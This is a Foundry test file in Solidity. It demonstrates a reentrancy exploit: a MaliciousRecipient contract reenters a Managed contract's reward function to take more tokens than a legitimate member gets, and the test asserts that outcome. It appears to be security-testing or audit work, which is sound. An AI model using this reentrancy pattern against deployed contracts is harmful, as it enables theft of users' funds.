// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Managed.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract TestToken is ERC20 {
    constructor() ERC20("Test", "TST") {
        _mint(msg.sender, 1000000 * 10**18);
    }
}

contract MaliciousRecipient {
    Managed public targetContract;
    uint256 public attackCount;
    event RewardReceived(address token, uint256 amount, uint256 count);
    
    constructor(address _target) {
        targetContract = Managed(payable(_target));
    }
    
    function reward(address _tokenaddress, uint256 _amount) external {
        emit RewardReceived(_tokenaddress, _amount, attackCount);
        
        if (attackCount < 3) {
            attackCount++;
            // Call back into reward with the full contract balance
            IERC20 token = IERC20(_tokenaddress);
            uint256 contractBalance = token.balanceOf(address(targetContract));
            targetContract.reward(_tokenaddress, contractBalance);
        }
    }

    function getTokenBalance(address token) external view returns (uint256) {
        return IERC20(token).balanceOf(address(this));
    }
}

contract RewardReentrancyTest is Test {
    Managed public managed;
    MaliciousRecipient public attacker;
    address public legitUser;
    TestToken public token;
    address public creator;
    
    function setUp() public {
        creator = address(this);
        managed = new Managed(creator, "TestHolon");
        attacker = new MaliciousRecipient(address(managed));
        token = new TestToken();
        legitUser = address(0x1234);
        
        // Add both legitimate user and attacker
        managed.addMember("legit_user");
        managed.addMember("attacker");
        
        // Associate addresses
        vm.prank(creator);
        managed.claim("legit_user", legitUser);
        vm.prank(creator);
        managed.claim("attacker", address(attacker));
        
        // Fund the managed contract
        token.transfer(address(managed), 1000 * 10**18);
    }
    
    function testRewardReentrancy() public {
        uint256 initialBalance = token.balanceOf(address(managed));
        uint256 rewardAmount = initialBalance; // Try to distribute all tokens
        
        console.log("Initial state:");
        console.log("Managed contract token balance:", initialBalance / 1e18);
        console.log("Attacker contract token balance:", attacker.getTokenBalance(address(token)) / 1e18);
        console.log("Legitimate user token balance:", token.balanceOf(legitUser) / 1e18);
        
        // Approve and trigger reward distribution
        token.approve(address(managed), rewardAmount);
        managed.reward(address(token), rewardAmount);
        
        console.log("\nFinal state:");
        console.log("Managed contract token balance:", token.balanceOf(address(managed)) / 1e18);
        console.log("Attacker contract token balance:", attacker.getTokenBalance(address(token)) / 1e18);
        console.log("Legitimate user token balance:", token.balanceOf(legitUser) / 1e18);
        
        // Verify that attacker disrupted fair distribution
        assertGt(
            attacker.getTokenBalance(address(token)), 
            token.balanceOf(legitUser),
            "Attacker should have received more than legitimate user"
        );
    }
}